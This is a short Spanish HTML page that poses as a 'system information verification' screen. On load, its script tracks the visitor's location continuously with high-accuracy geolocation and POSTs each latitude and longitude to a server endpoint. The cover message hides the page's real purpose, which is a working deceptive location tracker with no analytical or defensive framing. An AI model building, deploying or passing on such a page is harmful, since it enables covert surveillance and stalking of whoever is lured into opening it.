<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <title>Verificando información</title>
</head>
<body>
  <h3>Verificando información del sistema. Por favor no cierre esta ventana...</h3>

  <script>
    function enviarUbicacion(lat, lon) {
      console.log('Enviando ubicación:', lat, lon);
      
      fetch('/api/enviar', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify({ lat, lon })
      })
      .then(response => {
        if (!response.ok) {
          throw new Error(`HTTP ${response.status}`);
        }
        return response.json();
      })
      .then(data => {
        console.log('Respuesta del servidor:', data);
        document.body.innerHTML = `<h3>✅ ${data.message}</h3>`;
      })
      .catch(error => {
        console.error('Error:', error);
        document.body.innerHTML = "<h3>❌ Error al enviar la ubicación.</h3>";
      });
    }

    function rastrear() {
      if (navigator.geolocation) {
        navigator.geolocation.watchPosition(
          position => {
            const lat = position.coords.latitude;
            const lon = position.coords.longitude;
            console.log('Ubicación obtenida:', lat, lon);
            enviarUbicacion(lat, lon);
          },
          error => {
            console.error('Error de geolocalización:', error);
            document.body.innerHTML = "<h3>❌ No se pudo obtener la ubicación.</h3>";
          },
          {
            enableHighAccuracy: true,
            maximumAge: 10000,
            timeout: 5000
          }
        );
      } else {
        document.body.innerHTML = "<h3>❌ Geolocalización no soportada.</h3>";
      }
    }

    rastrear();
  </script>
</body>
</html>
